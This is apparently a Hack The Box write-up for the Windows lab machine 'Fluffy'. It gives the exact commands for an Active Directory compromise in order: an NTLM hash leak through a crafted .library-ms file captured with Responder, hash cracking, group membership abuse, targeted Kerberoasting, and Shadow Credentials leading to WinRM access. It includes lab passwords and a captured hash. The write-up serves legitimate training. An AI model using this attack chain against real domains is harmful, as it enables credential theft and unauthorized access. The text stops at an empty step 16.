# Fluffy

**Platform: Hack the Box**

**OS: Windows**

**Diffculty: Easy**


## Key Learnings


## **Disclaimer: Potential spoilers below**


## Walkthrough

As is common in real life Windows pentests, you will start the Fluffy box with credentials for the following account: `j.fleischman / J0elTHEM4n1990!`

1. Run nmap to get open ports first

```
nmap -Pn -p- --open -T5 --min-rate=1000 10.129.232.88 -oN fluffy_open_ports

PORT      STATE SERVICE
53/tcp    open  domain
88/tcp    open  kerberos-sec
139/tcp   open  netbios-ssn
389/tcp   open  ldap
445/tcp   open  microsoft-ds
464/tcp   open  kpasswd5
593/tcp   open  http-rpc-epmap
636/tcp   open  ldapssl
3268/tcp  open  globalcatLDAP
3269/tcp  open  globalcatLDAPssl
5985/tcp  open  wsman
9389/tcp  open  adws
49667/tcp open  unknown
49694/tcp open  unknown
49702/tcp open  unknown
49713/tcp open  unknown
49726/tcp open  unknown
```

2. Extract the open ports and do a deeper service scan on them

Get open port numbers first:

`grep -E '^[0-9]+/tcp.*open' fluffy_open_ports | cut -d/ -f1 | paste -sd, > ports.txt`

Then run service scan for open ports:

```
nmap -sC -sV -Pn -p $(cat open_ports.txt) -oN initial_service_scan -T5 --min-rate=1000 10.129.232.88

Starting Nmap 7.94SVN ( https://nmap.org ) at 2026-02-25 16:15 CST
Nmap scan report for 10.129.232.88
Host is up (0.067s latency).

PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Simple DNS Plus
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2026-02-26 05:15:42Z)
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: fluffy.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=DC01.fluffy.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::<unsupported>, DNS:DC01.fluffy.htb
| Not valid before: 2025-04-17T16:04:17
|_Not valid after:  2026-04-17T16:04:17
|_ssl-date: 2026-02-26T05:17:11+00:00; +7h00m00s from scanner time.
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: fluffy.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=DC01.fluffy.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::<unsupported>, DNS:DC01.fluffy.htb
| Not valid before: 2025-04-17T16:04:17
|_Not valid after:  2026-04-17T16:04:17
|_ssl-date: 2026-02-26T05:17:12+00:00; +7h00m00s from scanner time.
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: fluffy.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=DC01.fluffy.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::<unsupported>, DNS:DC01.fluffy.htb
| Not valid before: 2025-04-17T16:04:17
|_Not valid after:  2026-04-17T16:04:17
|_ssl-date: 2026-02-26T05:17:11+00:00; +7h00m00s from scanner time.
3269/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: fluffy.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=DC01.fluffy.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::<unsupported>, DNS:DC01.fluffy.htb
| Not valid before: 2025-04-17T16:04:17
|_Not valid after:  2026-04-17T16:04:17
|_ssl-date: 2026-02-26T05:17:12+00:00; +7h00m00s from scanner time.
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
9389/tcp  open  mc-nmf        .NET Message Framing
49667/tcp open  msrpc         Microsoft Windows RPC
49693/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49694/tcp open  msrpc         Microsoft Windows RPC
49702/tcp open  msrpc         Microsoft Windows RPC
49713/tcp open  msrpc         Microsoft Windows RPC
49726/tcp open  msrpc         Microsoft Windows RPC
49748/tcp open  msrpc         Microsoft Windows RPC
Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-time: 
|   date: 2026-02-26T05:16:31
|_  start_date: N/A
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled and required
|_clock-skew: mean: 6h59m59s, deviation: 0s, median: 6h59m59s

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 97.55 seconds
```

3. We see that ports such as LDAP, DNS and Kerberos are open, signaling that this is a Domain Controller. Since we are given creds, we'll check what kind of access we have on SMB:

`nxc smb fluffy.htb -u 'j.fleischman' -p 'J0elTHEM4n1990!' --shares`

<img width="2128" height="606" alt="image" src="https://github.com/user-attachments/assets/710e5910-abf4-48eb-96f5-534a91f1d3ee" />

We have READ,WRITE access to the IT share. Our next move will be to see what's on there.

4. Let's connect to the IT share:

`smbclient //fluffy.htb/IT -U j.fleischman`

Enter the password when prompted and we list the contents of the share. After turning off `PROMPT` and turning on `RECURSE`, we proceed to download all the files in the share to our local machine.

<img width="2130" height="1054" alt="image" src="https://github.com/user-attachments/assets/98945555-d0ba-4bd3-b428-8dc782db9855" />

5. Opening the `Upgrade_Notice.pdf` file shows a list of CVEs that the machine may be vulnerable to

<img width="1142" height="946" alt="image" src="https://github.com/user-attachments/assets/491ea959-3c79-4579-a75e-eb1b6bd329a0" />

6. We look into each CVE, starting from the most critical one and CVE-2025-24071 looks very promising.

This CVE exploits a NTLM leak where opening a malicious `.library-ms` triggers an SMB connection to the server specified. This leads to the NTLM hash of the user being leaked to the attacker. We download this PoC from github: https://github.com/helidem/CVE-2025-24054_CVE-2025-24071-PoC

7. After running the Python PoC script and entering our local IP, we get a `xd.library-ms` file pointing to our machine. Now we will exploit the CVE with the following steps:

I. Run responder: `sudo responder -I tun0`
II. Connect to IT SMB share, entering the given password when prompted: `smbclient -U j.fleischman //fluffy.htb/IT`
III. Upload the `xd.library-ms` file: `put xd.library-ms`
IV. Wait until we get the NTLM hash on Responder

<img width="1610" height="840" alt="image" src="https://github.com/user-attachments/assets/7639d4f2-fb2b-48de-843b-9525fa74f0c5" />

We got p.agila's NTLMv2 hash!

```
p.agila::FLUFFY:fa2cb766a8c2197b:AE6CEE0CEDAA5F61939E43B49E65C9A0:0101000000000000800F0B6D78A6DC01F5D038DEC5EB4E7300000000020008004E00390034005A0001001E00570049004E002D004B00520045004E00520050005500390058005300550004003400570049004E002D004B00520045004E0052005000550039005800530055002E004E00390034005A002E004C004F00430041004C00030014004E00390034005A002E004C004F00430041004C00050014004E00390034005A002E004C004F00430041004C0007000800800F0B6D78A6DC01060004000200000008003000300000000000000001000000002000005F78776134D3E95B3AD207CF55F9D90735116665981DB9FF5568746267CF3DA70A001000000000000000000000000000000000000900220063006900660073002F00310030002E00310030002E00310035002E003100360033000000000000000000
```

8. Let's try to crack this hash using Hashcat:

`hashcat -m 5600 p.agila.ntlmv2_hash /usr/share/wordlists/rockyou.txt`

We get the creds: `p.agila:prometheusx-303`

9. Now, we'll check Bloodhound to see if there's a path forward from `p.agila`. To run bloodhound, we'll do the following steps:

- Run neo4j: `sudo neo4j console`
- Run Bloodhound: `sudo bloodhound`
- Run the python Bloodhound connector: `sudo bloodhound-python -d fluffy.htb -u j.fleischman -p $(cat creds/j.fleischman.pass) -ns 10.129.232.88 -c all`

Then, we find the shortest path from p.agila:

<img width="971" height="702" alt="image" src="https://github.com/user-attachments/assets/34613446-f543-41ee-890c-64c47ddf6ed4" />

10. From Bloodhound, we know that `p.agila` is part of the SERVICE ACCOUNT MANAGERS group which can add members to the SERVICE ACCOUNTS group. Once we add our compromised user to the group, we can exploit the GenericWrite permissions to do a targeted Kerberoast attack on `WINRM_SVC` and PS remote into the machine. 

So our first course of action is to add our `p.agila` user to the SERVICE ACCOUNTS group. We will do so using bloodyAD:

`bloodyAD --host dc01.fluffy.htb -d fluffy.htb -u p.agila -p $(cat creds/p.agila.pass) add groupMember 'SERVICE ACCOUNTS' p.agila`

<img width="1069" height="84" alt="image" src="https://github.com/user-attachments/assets/c3ca46c5-15ce-418f-9031-2f76341b4048" />

11. Next, we'll abuse our group membership to do a targeted Kerberoast attack on `WINRM_SVC`

`targetedKerberoast.py -u p.agila -p $(cat creds/p.agila.pass) -d fluffy.htb`

<img width="1070" height="924" alt="image" src="https://github.com/user-attachments/assets/c5eae65a-d401-4b7a-817e-b716b0967d6d" />

12. We get back 3 service account hashes. However, since we already know the one we need is the `WINRM_SVC` account, we'll proceed to crack the hash for that one.

`hashcat -m 13100 winrm_svc.kerberoast_hash /usr/share/wordlist/rockyou.txt`

 None of the hashes are crackeable, which means that this is not the intended way. Fortunately, there's another way to exploit GenericWrite permissions on a user via the Shadow Credentials attack.

 13. We'll perform this attack using `pywhisker`

`python3 ~/tools/pywhisker/pywhisker/pywhisker.py -d fluffy.htb -u p.agila -p $(cat creds/p.agila.pass) --target 'winrm_svc' --action 'add' --filename winrm_svc -P 'P@ssw0rd!'`

<img width="1072" height="394" alt="image" src="https://github.com/user-attachments/assets/cd6af788-ca26-42e1-a6d8-9d7155ed4569" />

14. With the pfx certificate, we can request for a TGT for user `WINRM_SVC`

`python3 /opt/PKINITtools/gettgtpkinit.py -cert-pfx winrm_svc.pfx -pfx-pass 'P@ssw0rd!' fluffy.htb/winrm_svc -dc-ip 10.129.232.88 winrm_svc.ccache`

<img width="1064" height="289" alt="image" src="https://github.com/user-attachments/assets/c60abd17-cfbf-49f8-bb44-32d4ffcdfb34" />

15. With the TGT, we can use Kerberos authentication to Powershell remote into the machine using `evil-winrm`:

One thing to note: we must use the FQDN of the Domain Controller and we must add the following to the `/etc/krb5.conf` file under the realms section:

```
FLUFFY.HTB = {
    kdc = dc01.fluffy.htb
}
```

Now we can use Kerberos auth with evil-winrm and grab the user flag!

`evil-winrm -r fluffy.htb -i dc01.fluffy.htb`

<img width="488" height="175" alt="image" src="https://github.com/user-attachments/assets/7d68a762-4d60-46fd-9e25-4ed54842e7d2" />

16. 
